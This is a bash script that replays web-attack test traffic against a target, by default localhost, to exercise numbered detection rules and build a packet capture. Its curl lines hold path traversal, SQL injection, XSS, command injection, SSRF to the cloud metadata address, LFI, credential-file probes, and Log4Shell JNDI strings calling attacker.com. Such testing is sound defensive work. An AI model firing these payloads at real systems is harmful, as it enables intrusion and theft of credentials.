#!/bin/bash
# Replays the Caddy attack scenarios used to build caddy_test.pcap against a live target.
# Usage: ./attack_traffic.sh [target_host:port]
#   default target is localhost:8080 (matches `python3 -m http.server 8080`)

TARGET="${1:-localhost:8080}"
BASE="http://${TARGET}"

echo "[*] Firing Caddy rule test traffic at ${BASE}"

curl -s --path-as-is "${BASE}/../../etc/passwd" > /dev/null                       # 996003 path traversal
curl -s "${BASE}/?id=1%20UNION%20SELECT%201,2,3--" > /dev/null                    # 996004 sqli
curl -s "${BASE}/wp-admin" > /dev/null                                            # 996005 sensitive path
curl -s "${BASE}/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E" > /dev/null              # 996008 xss
curl -s "${BASE}/?x=%7Cwhoami" > /dev/null                                        # 996009 cmd injection
curl -s -A "sqlmap/1.7" "${BASE}/" > /dev/null                                    # 996010 scanner ua
curl -s -X TRACE "${BASE}/" > /dev/null                                           # 996011 trace method
curl -s -g "${BASE}/?x=\${jndi:ldap://attacker.com/a}" > /dev/null                # 996012 log4shell
curl -s -H "User-Agent: \${jndi:ldap://attacker.com/a}" "${BASE}/" > /dev/null    # 996033 log4shell in header
curl -s "${BASE}/wp-config.php" > /dev/null                                       # 996013 sensitive file
curl -s "${BASE}/id_rsa" > /dev/null                                              # 996014 credential file
curl -s "${BASE}/database.sql" > /dev/null                                        # 996015 backup file
curl -s "${BASE}/.git/config" > /dev/null                                         # 996016 source control
curl -s "${BASE}/error.log" > /dev/null                                           # 996017 log file
curl -s "${BASE}/passwords.txt" > /dev/null                                       # 996020 suspicious filename
curl -s "${BASE}/login" > /dev/null                                              # 996021 auth endpoint
curl -s "${BASE}/..%c0%ae/etc/passwd" > /dev/null                                 # 996023 encoding evasion
curl -s "${BASE}/?file=php://filter/resource=index.php" > /dev/null              # 996024 lfi
curl -s "${BASE}/?url=http://169.254.169.254/latest/meta-data/" > /dev/null      # 996025 ssrf
curl -s -g "${BASE}/graphql?query=__schema{types{name}}" > /dev/null             # 996026 graphql
curl -s -X DEBUG "${BASE}/" > /dev/null                                          # 996027 dangerous method
curl -s -A "[]" "${BASE}/" > /dev/null                                           # 996028 suspicious ua
curl -s -X POST "${BASE}/uploads/shell.php" > /dev/null                          # 996029 dangerous upload
curl -s "${BASE}/$(python3 -c 'print("A"*1001)')" > /dev/null                    # 996030 oversized uri
curl -s -X POST "${BASE}/uploads/shell.php.jpg" > /dev/null                      # 996031 double extension
curl -s -X POST "${BASE}/uploads/malware.docm" > /dev/null                       # 996032 archive upload

for i in $(seq 1 11); do curl -s "${BASE}/wp-admin" > /dev/null; done            # 996018 dir enum (threshold: 10)
for i in $(seq 1 9);  do curl -s --path-as-is "${BASE}/../../etc/passwd" > /dev/null; done  # 996019 traversal flood (threshold: 8)
for i in $(seq 1 11); do curl -s "${BASE}/login" > /dev/null; done               # 996022 brute force (threshold: 10)

echo "[*] Done."
